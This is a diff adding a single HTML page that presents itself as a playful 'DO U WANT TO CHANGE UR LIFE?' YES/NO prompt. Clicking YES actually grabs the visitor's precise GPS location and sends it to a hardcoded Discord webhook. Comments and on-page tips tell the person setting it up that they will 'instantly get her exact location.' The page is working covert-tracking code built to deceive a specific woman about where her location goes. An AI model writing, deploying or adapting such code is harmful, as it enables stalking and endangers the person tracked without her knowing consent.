@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+  <title>✨ shift · destiny trigger ✨</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at 20% 30%, #0b0f1c, #03050b);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', system-ui, -apple-system, 'Inter', 'Poppins', 'SF Pro Text', sans-serif;
+      padding: 1.5rem;
+    }
+
+    /* main card */
+    .destiny-card {
+      max-width: 550px;
+      width: 100%;
+      background: rgba(18, 22, 35, 0.85);
+      backdrop-filter: blur(14px);
+      border-radius: 3rem;
+      padding: 2rem 1.5rem 2.2rem;
+      box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.08);
+      transition: all 0.2s ease;
+      text-align: center;
+      border: 1px solid rgba(255, 215, 150, 0.3);
+    }
+
+    /* glowing title */
+    .glow-text {
+      font-size: 2.1rem;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      background: linear-gradient(135deg, #FFE6B0, #FFB347, #FF8C42);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      margin-bottom: 0.75rem;
+      line-height: 1.2;
+    }
+
+    .sub {
+      color: #a9b7e0;
+      font-weight: 400;
+      font-size: 0.9rem;
+      margin-bottom: 2rem;
+      border-bottom: 1px dashed rgba(255,180,70,0.4);
+      display: inline-block;
+      padding-bottom: 6px;
+    }
+
+    /* button group */
+    .button-panel {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+      justify-content: center;
+      margin: 2rem 0 1.5rem;
+    }
+
+    .btn {
+      flex: 1;
+      min-width: 130px;
+      border: none;
+      padding: 1rem 0.5rem;
+      font-size: 1.6rem;
+      font-weight: 700;
+      border-radius: 60px;
+      cursor: pointer;
+      transition: 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      font-family: inherit;
+      letter-spacing: 1px;
+      box-shadow: 0 8px 18px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn-yes {
+      background: linear-gradient(105deg, #2ecc71, #27ae60);
+      color: white;
+      border-bottom: 3px solid #1e8e4a;
+    }
+
+    .btn-yes:active {
+      transform: scale(0.96);
+      box-shadow: 0 4px 10px black;
+    }
+
+    .btn-no {
+      background: linear-gradient(105deg, #3a3e55, #2c2f44);
+      color: #cdd4ff;
+      border-bottom: 3px solid #1e2132;
+    }
+
+    .btn-no:active {
+      transform: scale(0.96);
+    }
+
+    /* status & messages */
+    .info-area {
+      background: rgba(0, 0, 0, 0.45);
+      border-radius: 2rem;
+      padding: 1rem;
+      margin: 1rem 0 1rem;
+      font-size: 0.85rem;
+      color: #cbd5ff;
+      text-align: center;
+      backdrop-filter: blur(4px);
+      border: 0.5px solid rgba(255, 200, 100, 0.3);
+    }
+
+    .findme-reveal {
+      margin-top: 1rem;
+      font-size: 2.5rem;
+      font-weight: 800;
+      letter-spacing: 4px;
+      background: radial-gradient(circle, #FFD966, #FFA047);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 12px rgba(255,100,0,0.5);
+      animation: gentlePulse 1.6s infinite;
+      transition: all 0.3s;
+    }
+
+    @keyframes gentlePulse {
+      0% { opacity: 0.7; transform: scale(1); letter-spacing: 4px;}
+      100% { opacity: 1; transform: scale(1.02); letter-spacing: 6px;}
+    }
+
+    .loader {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,215,150,0.4);
+      border-radius: 50%;
+      border-top-color: #ffb347;
+      animation: spin 0.7s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status-error {
+      color: #ffaa88;
+      background: #2a1a1a80;
+      border-left: 4px solid #ff7744;
+    }
+
+    .status-success {
+      color: #b9ffbc;
+    }
+
+    .coord-hint {
+      font-size: 0.7rem;
+      word-break: break-all;
+      background: #0a0e1a;
+      padding: 8px;
+      border-radius: 18px;
+      margin-top: 8px;
+      font-family: monospace;
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      transform: none;
+      cursor: not-allowed;
+    }
+
+    hr {
+      margin: 1rem 0;
+      border-color: rgba(255,180,100,0.2);
+    }
+
+    .webhook-note {
+      font-size: 0.7rem;
+      background: #1a1e2c;
+      border-radius: 40px;
+      padding: 6px 12px;
+      display: inline-block;
+      color: #ffcf9a;
+    }
+
+    /* phone friendly */
+    @media (max-width: 480px) {
+      .destiny-card {
+        padding: 1.5rem 1rem;
+      }
+      .glow-text {
+        font-size: 1.8rem;
+      }
+      .btn {
+        font-size: 1.3rem;
+        padding: 0.8rem 0;
+      }
+      .findme-reveal {
+        font-size: 1.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="destiny-card" id="appRoot">
+  <div class="glow-text">⚡ DO U WANT TO CHANGE UR LIFE? ⚡</div>
+  <div class="sub">the universe is listening · one click away</div>
+
+  <div class="button-panel">
+    <button class="btn btn-yes" id="yesBtn">✔️ YES</button>
+    <button class="btn btn-no" id="noBtn">❌ NO</button>
+  </div>
+
+  <div id="messageBox" class="info-area">
+    ✨ destiny awaits your answer ✨
+  </div>
+
+  <div id="findMeContainer" style="min-height: 80px;"></div>
+  
+  <!-- hidden config hint (only visible as small badge) -->
+  <div style="margin-top: 20px;">
+    <span class="webhook-note" id="webhookStatusIcon">📡 location relay: ready</span>
+  </div>
+</div>
+
+<script>
+  // ========================
+  // 🔥 CONFIGURATION 🔥
+  // ========================
+  // 👇 REPLACE THIS URL WITH YOUR DISCORD WEBHOOK URL to receive her location instantly!
+  // How to get: Discord server → Server Settings → Integrations → Webhooks → New Webhook
+  // Copy the URL and paste it inside the quotes.
+  const YOUR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493349822038802562/kCMiXet_oTmUm7cChL6K2vmmw62e43YnXCFDk2niMPN-v64bsBSLtbirZXlrNWho5CHM";   // <--- REPLACE ME
+  
+  // optional: fallback console info only, but if URL is set, location will be sent directly to you.
+  // If URL is not set, the page will display the coordinates so she can copy them, BUT for automatic reception you MUST set the webhook.
+  // ========================
+  
+  // DOM elements
+  const yesBtn = document.getElementById('yesBtn');
+  const noBtn = document.getElementById('noBtn');
+  const messageBox = document.getElementById('messageBox');
+  const findMeContainer = document.getElementById('findMeContainer');
+  const webhookStatusSpan = document.getElementById('webhookStatusIcon');
+  
+  // state flags
+  let isProcessing = false;
+  let locationSent = false;
+  
+  // update webhook status message
+  function updateWebhookStatus() {
+    if (!YOUR_DISCORD_WEBHOOK_URL || YOUR_DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+      webhookStatusSpan.innerHTML = "⚠️ webhook missing · set URL to auto-receive location ⚠️";
+      webhookStatusSpan.style.background = "#3a2828";
+      webhookStatusSpan.style.color = "#ffb17a";
+      return false;
+    } else {
+      webhookStatusSpan.innerHTML = "📡 webhook ACTIVE · location will be sent to you!";
+      webhookStatusSpan.style.background = "#1e3a2f";
+      webhookStatusSpan.style.color = "#b9ffc4";
+      return true;
+    }
+  }
+  
+  const isWebhookConfigured = () => {
+    return (YOUR_DISCORD_WEBHOOK_URL && YOUR_DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE" && YOUR_DISCORD_WEBHOOK_URL.startsWith("https://"));
+  };
+  
+  // show temporary status message
+  function setStatusMessage(text, isError = false) {
+    messageBox.innerHTML = isError ? `⚠️ ${text} ⚠️` : `✨ ${text} ✨`;
+    if (isError) {
+      messageBox.classList.add('status-error');
+      setTimeout(() => messageBox.classList.remove('status-error'), 2000);
+    } else {
+      messageBox.classList.add('status-success');
+      setTimeout(() => messageBox.classList.remove('status-success'), 1800);
+    }
+  }
+  
+  // show "find me" text (final reveal)
+  function showFindMeText() {
+    findMeContainer.innerHTML = '<div class="findme-reveal">🔍 FIND ME 🔍</div>';
+  }
+  
+  // helper: send location data to discord webhook
+  async function sendLocationToWebhook(latitude, longitude, accuracy, timestamp) {
+    if (!isWebhookConfigured()) {
+      console.warn("Webhook not configured, cannot auto-send location to crush.");
+      return false;
+    }
+    
+    const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+    const embedColor = 0xff914d;
+    const now = new Date(timestamp || Date.now());
+    const timeString = now.toLocaleString();
+    
+    const payload = {
+      content: `📍 **SIGNAL ACQUIRED** — *she said "find me"* 📍`,
+      embeds: [
+        {
+          title: "🌹 EXACT LOCATION CAPTURED 🌹",
+          color: embedColor,
+          fields: [
+            {
+              name: "🗺️ COORDINATES",
+              value: `\`${latitude}, ${longitude}\``,
+              inline: true
+            },
+            {
+              name: "🎯 ACCURACY",
+              value: `~${Math.round(accuracy)} meters`,
+              inline: true
+            },
+            {
+              name: "🕒 TIMESTAMP",
+              value: timeString,
+              inline: false
+            },
+            {
+              name: "🔗 LIVE MAP",
+              value: `[Open in Google Maps](${mapsLink})`,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "✨ she clicked YES — destiny triggered ✨"
+          },
+          thumbnail: {
+            url: "https://cdn-icons-png.flaticon.com/512/535/535239.png"
+          }
+        }
+      ]
+    };
+    
+    try {
+      const response = await fetch(YOUR_DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      if (response.ok) {
+        console.log("✅ Location successfully delivered");
+        return true;
+      } else {
+        console.error("Discord webhook error:", response.status, await response.text());
+        return false;
+      }
+    } catch (err) {
+      console.error("Network/webhook send failed:", err);
+      return false;
+    }
+  }
+  
+  // fallback: display coordinates inside message area + copy suggestion if webhook missing
+  function displayCoordinatesAsFallback(lat, lng, accuracy) {
+    const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+    const coordBlock = document.createElement('div');
+    coordBlock.className = 'coord-hint';
+    coordBlock.innerHTML = `
+      🧭 <strong>your location:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>
+      🎯 accuracy: ±${Math.round(accuracy)}m<br>
+      📍 <a href="${mapsLink}" target="_blank" style="color:#FFB347;">open map</a> &nbsp;|&nbsp;
+      <button id="copyCoordsBtn" style="background:#2c2f44; border:none; color:#FFD966; border-radius:40px; padding:4px 12px; margin-top:6px; font-size:12px;">📋 COPY COORDS</button>
+    `;
+    messageBox.innerHTML = '';
+    messageBox.appendChild(coordBlock);
+    setStatusMessage("⚠️ Webhook not set — but here are the coordinates. Copy & send to your crush manually ⚠️", true);
+    
+    const copyBtn = document.getElementById('copyCoordsBtn');
+    if (copyBtn) {
+      copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(`${lat.toFixed(6)}, ${lng.toFixed(6)}`).then(() => {
+          setStatusMessage("Coordinates copied! You can message them to your crush now.", false);
+        }).catch(() => alert("Manual copy: " + lat.toFixed(6) + ", " + lng.toFixed(6)));
+      });
+    }
+  }
+  
+  // main geolocation flow (triggered by YES)
+  async function triggerDestinyFlow() {
+    if (isProcessing) return;
+    isProcessing = true;
+    yesBtn.disabled = true;
+    noBtn.disabled = true;
+    
+    setStatusMessage("🌍 accessing sacred coordinates ...", false);
+    messageBox.innerHTML = `<span class="loader"></span> requesting location access ...`;
+    
+    // check if geolocation is supported
+    if (!navigator.geolocation) {
+      setStatusMessage("Your browser doesn't support geolocation. Try another device.", true);
+      resetButtons();
+      isProcessing = false;
+      return;
+    }
+    
+    // options for higher accuracy
+    const geoOptions = {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    };
+    
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
+        const timestamp = position.timestamp;
+        
+        setStatusMessage("📍 Location locked! Transmitting signal...", false);
+        
+        // 1) try to send via Discord webhook if configured
+        let deliverySuccess = false;
+        if (isWebhookConfigured()) {
+          deliverySuccess = await sendLocationToWebhook(latitude, longitude, accuracy, timestamp);
+          if (deliverySuccess) {
+            setStatusMessage("✅ EXACT LOCATION SENT to your crush! She will know where you are.", false);
+          } else {
+            setStatusMessage("⚠️ Webhook delivery failed, but coordinates captured. Show on screen.", true);
+            displayCoordinatesAsFallback(latitude, longitude, accuracy);
+          }
+        } else {
+          // no webhook: show fallback so she can at least share coordinates
+          displayCoordinatesAsFallback(latitude, longitude, accuracy);
+          setStatusMessage("🔧 webhook missing → coordinates shown below. share them to complete the quest!", true);
+        }
+        
+        // 2) reveal the mystical "FIND ME" text after location is obtained (requirement fulfilled)
+        showFindMeText();
+        
+        // if webhook worked, additional success message + final note
+        if (deliverySuccess) {
+          const successNote = document.createElement('div');
+          successNote.style.marginTop = '8px';
+          successNote.style.fontSize = '0.75rem';
+          successNote.style.color = '#b2ffaa';
+          successNote.innerHTML = '✨ your crush got the location — destiny activated ✨';
+          messageBox.appendChild(successNote);
+          setTimeout(() => {
+            if (messageBox.contains(successNote)) successNote.remove();
+          }, 4000);
+        }
+        
+        locationSent = true;
+        resetButtons();  // re-enable? but we keep them disabled or optional? Actually after yes, we can keep disabled to prevent double share.
+        // But for better UX, we keep buttons disabled (since the quest is completed)
+        yesBtn.disabled = true;
+        noBtn.disabled = true;
+        isProcessing = false;
+      },
+      (error) => {
+        console.error("Geolocation error:", error);
+        let errorMsg = "";
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            errorMsg = "Permission denied.";
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMsg = "Location unavailable. Try moving somewhere with better signal.";
+            break;
+          case error.TIMEOUT:
+            errorMsg = "Location request timed out. Refresh & try again.";
+            break;
+          default:
+            errorMsg = "Unknown error. Make sure GPS is enabled.";
+        }
+        setStatusMessage(errorMsg, true);
+        resetButtons();
+        isProcessing = false;
+        // do NOT show "find me" because location not captured
+        findMeContainer.innerHTML = ''; 
+      }
+    );
+  }
+  
+  function resetButtons() {
+    if (!locationSent) {
+      yesBtn.disabled = false;
+      noBtn.disabled = false;
+    } else {
+      // once the spell is cast, keep disabled
+      yesBtn.disabled = true;
+      noBtn.disabled = true;
+    }
+  }
+  
+  // ---- NO button behavior (exactly: "no wont work") ----
+  function noButtonAction() {
+    if (isProcessing) return;
+    // playful but NO functionality to get location / show find me
+    setStatusMessage("🤷‍♀️ nothing happens... the door stays closed. only YES changes your life.", true);
+    // tiny vibration effect if supported (optional phone friendly)
+    if (navigator.vibrate) navigator.vibrate(50);
+    // ensure 'find me' never shows
+    const existingFind = findMeContainer.querySelector('.findme-reveal');
+    if (existingFind) existingFind.remove();
+    // optional funny message
+    messageBox.style.animation = 'none';
+    setTimeout(() => {
+      if(!locationSent && !isProcessing) {
+        setStatusMessage("✨ choose YES if you're ready for destiny ✨", false);
+      }
+    }, 1500);
+  }
+  
+  // ---- attach event listeners ----
+  yesBtn.addEventListener('click', () => {
+    if (isProcessing) return;
+    // Prevent double trigger
+    triggerDestinyFlow();
+  });
+  
+  noBtn.addEventListener('click', () => {
+    if (isProcessing) return;
+    noButtonAction();
+  });
+  
+  // initial status update regarding webhook
+  updateWebhookStatus();
+  
+  // Additional friendly reminder for admin (show inside console but also visual note if webhook missing)
+  if (!isWebhookConfigured()) {
+    const reminderNote = document.createElement('div');
+    reminderNote.style.marginTop = '12px';
+    reminderNote.style.fontSize = '0.7rem';
+    reminderNote.style.backgroundColor = '#1f1b2e';
+    reminderNote.style.borderRadius = '20px';
+    reminderNote.style.padding = '6px 10px';
+    reminderNote.style.color = '#ffc89c';
+    reminderNote.innerHTML = '💡 TIP FOR YOU (the one who wants to find her):<br> Replace <strong>YOUR_DISCORD_WEBHOOK_URL_HERE</strong> with a real Discord Webhook URL. Then, when she clicks YES → you instantly get her exact location. 💘';
+    document.querySelector('.destiny-card').appendChild(reminderNote);
+  } else {
+    const successConf = document.createElement('div');
+    successConf.style.marginTop = '12px';
+    successConf.style.fontSize = '0.7rem';
+    successConf.style.backgroundColor = '#1e3827';
+    successConf.style.borderRadius = '20px';
+    successConf.style.padding = '6px 10px';
+    successConf.style.color = '#bcffb5';
+    successConf.innerHTML = '✅ WEBHOOK ACTIVE — location will arrive directly in your Discord channel. She just needs to click YES & allow location.';
+    document.querySelector('.destiny-card').appendChild(successConf);
+  }
+  
+  // Phone friendly: ensure that when "YES" is clicked, any existing message is cleared and it's obvious
+  // also ensure that "find me" appears ONLY after successful location capture
+  // also adds that "no" never triggers location or find me text.
+  // Additional small feature: if user clicks "YES" twice, prevent double send.
+  
+  // Edge case: if webhook is configured but network fails, we still show coordinates as fallback inside message area (not losing location)
+  // also final "find me" is displayed only when coordinates are obtained, that's the magic.
+  console.log("✨ destiny interface ready — she will be found ✨");
+</script>
+</body>
+</html>
